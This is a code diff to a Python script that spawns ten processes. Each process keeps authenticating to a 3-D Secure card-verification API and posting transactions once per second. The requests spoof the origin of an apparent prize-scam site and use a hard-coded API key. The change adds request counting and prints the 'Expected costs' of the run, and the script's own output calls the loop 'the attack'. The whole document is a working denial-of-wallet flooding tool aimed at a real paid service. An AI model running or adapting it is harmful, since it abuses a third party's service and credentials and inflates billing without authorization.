@@ -7,6 +7,7 @@ from requests import post
 from time import sleep
 
 def requests():
+	COUNT = 0
 	do_auth = True
 	AUTHORIZE_URL = "https://api.3dsintegrator.com/v2/authorize"
 	REQUEST_URL = "https://api.3dsintegrator.com/v2/authenticate/browser"
@@ -77,59 +78,78 @@ def requests():
 		"transactionForcedTimeout": "20"
 	}
 
-	while True:
-		if do_auth:
-			try:
-				authentication = post(AUTHORIZE_URL, headers=auth_header)
-				authorization = authentication.headers["Authorization"]
-			except:
-				print("Failed to authenticate. Waiting for 10 seconds...")
-				sleep(10)
-				continue
+	try:
+		while True:
+			if do_auth:
+				try:
+					authentication = post(AUTHORIZE_URL, headers=auth_header)
+					authorization = authentication.headers["Authorization"]
+				except:
+					print("Failed to authenticate. Waiting for 10 seconds...")
+					sleep(10)
+					continue
+				else:
+					print("Authenticated. Continuing the attack...")
+					do_auth = False
+
+			card_header = { # Working
+				"authority": "api.3dsintegrator.com",
+				"method": "POST",
+				"path": "/v2/authenticate/browser",
+				"scheme": "https",
+				"accept": "*/*",
+				"accept-encoding": "gzip, deflate, br",
+				"accept-language": "en-US,en;q=0.9",
+				"authorization": authorization,
+				"content-length": "612",
+				"content-type": "application/json",
+				"dnt": "1",
+				"origin": "https://ipad1.bigbangprizes.com",
+				"referer": "https://ipad1.bigbangprizes.com/",
+				"sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"",
+				"sec-ch-ua-mobile": "?0",
+				"sec-ch-ua-platform": "\"Windows\"",
+				"sec-fetch-dest": "empty",
+				"sec-fetch-mode": "cors",
+				"sec-fetch-site": "cross-site",
+				"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
+				"x-3ds-api-key": "52343fe01e99f26eab489969b9718c20",
+				"x-3ds-sdk-version": "2.1.0.20210929"
+			}
+
+			transaction = post(REQUEST_URL, headers=card_header, json=card_data)
+			if transaction.status_code == 400:
+				COUNT+= 1
+				print(transaction.text, transaction.status_code)
+			elif transaction.status_code == 403:
+				print("Transaction forbidden. Reauthenticating...")
+				do_auth = True
 			else:
-				print("Authenticated. Continuing the attack...")
-				do_auth = False
+				print(f"Unhandled status code: {transaction.status_code}")
+				do_auth = True
+			sleep(1)
+	except:
+		print("\n\n[*] Exiting...")
 
-		card_header = { # Working
-			"authority": "api.3dsintegrator.com",
-			"method": "POST",
-			"path": "/v2/authenticate/browser",
-			"scheme": "https",
-			"accept": "*/*",
-			"accept-encoding": "gzip, deflate, br",
-			"accept-language": "en-US,en;q=0.9",
-			"authorization": authorization,
-			"content-length": "612",
-			"content-type": "application/json",
-			"dnt": "1",
-			"origin": "https://ipad1.bigbangprizes.com",
-			"referer": "https://ipad1.bigbangprizes.com/",
-			"sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"",
-			"sec-ch-ua-mobile": "?0",
-			"sec-ch-ua-platform": "\"Windows\"",
-			"sec-fetch-dest": "empty",
-			"sec-fetch-mode": "cors",
-			"sec-fetch-site": "cross-site",
-			"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
-			"x-3ds-api-key": "52343fe01e99f26eab489969b9718c20",
-			"x-3ds-sdk-version": "2.1.0.20210929"
-		}
-
-		transaction = post(REQUEST_URL, headers=card_header, json=card_data)
-		if transaction.status_code != 400:
-			do_auth = True
-		else:
-			print(transaction.text, transaction.status_code)
-		sleep(1)
+	exit(COUNT)
 
 def main():
 	workers = []
+	count = 0
 	for i in range(10):
 		workers.append(Process(target=requests))
 	for worker in workers:
 		worker.start()
+	try:
+		for worker in workers:
+			worker.join()
+	except:
+		pass
+
 	for worker in workers:
-		worker.join()
+		count+= worker.exitcode
+
+	print(f"\n[*] Total requests: {count}\n[*] Expected costs: ${count*0.15}")
 
 if __name__ == "__main__":
 	main()
